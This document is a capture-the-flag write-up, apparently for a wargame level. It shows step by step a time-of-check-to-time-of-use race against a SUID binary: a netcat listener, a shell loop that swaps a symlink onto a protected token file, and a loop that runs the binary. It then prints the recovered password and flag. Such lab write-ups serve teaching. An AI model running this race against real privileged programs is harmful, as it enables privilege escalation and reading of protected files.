# Level10

## 1. Identity

```bash
$ id
uid=2010(level10) gid=2010(level10) groups=2010(level10),100(users)
```

We are logged in as **level10**.

## 2. Home directory

```bash
$ pwd
/home/user/level10

$ ls -la
[...]
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
[...]
```

`token` is not readable

Let's execute this binary :

```bash
$ ./level10 file host
	sends file to host if you have access to it

$ ./level10 token localhost
You don't have access to token

$ ./level10 /bin/ls localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
```

It seems that our program is trying to connect to port `6969`.

## 3. Analyzing the binary

Using `strings` :

```bash
[...]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
[...]
```

The executable check if we have the rights to read the file with `access` then try to send it to a server and display its content but we have not the necessary rights on the token file.

```bash
$ man 2 access
[...]
NOTES
	Warning:  Using  access()  to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking      
	and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user  ID  to      
	the real ID and then call open(2).)
[...]
```

We will use the short time between `access` and `open` to change the file to be opened ([race condition exploit](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use))  

A race condition consists in quickly changing the pointing of a symbolic link between a file of which we have the rights and the file of which we don't have, so that `access` will returns us 'true' while `open` will opens the correct file.

## 4. Using race condition exploit

We have to open 3 windows.

### First Terminal - listener (must run first)

Listen to the port 6969 with netcat.

```bash
$ nc -lk 6969
```

- l : specify netcat should listen on specified port
- k : to stay listening after each connection

### Second Terminal - fast symlink toggler (swap target continuously)

We need a very fast toggler that repeatedly points `/tmp/level10_link` to a readable file (so `access()` succeeds) then immediately to the real protected file (`/home/user/level10/token`).

```bash
#!/bin/sh

touch /tmp/nothing

while true; do 
    ln -sf /tmp/nothing /tmp/level10_link # We need to have access to our first file, that's all
    ln -sf /home/user/level10/token /tmp/level10_link
done
```

### Third Terminal - run the vulnerable SUID program

Now we run an infinte loop that runs the SUID binary and request the `/tmp/level10_link` file to be sent to `localhost` :

```bash
while true; do
	/home/user/level10/level10 /tmp/level10_link 127.0.0.1;
done
```

## 5. Getting the flag

After running our 3 terminals we get in our first Terminal :

```bash
[...]
woupa2yuojeeaaed06riuj63c
[...]
```

We use it to login to flag10 and use `getflag` :

```bash
$ su flag10

Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !

$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

Mission Impossible
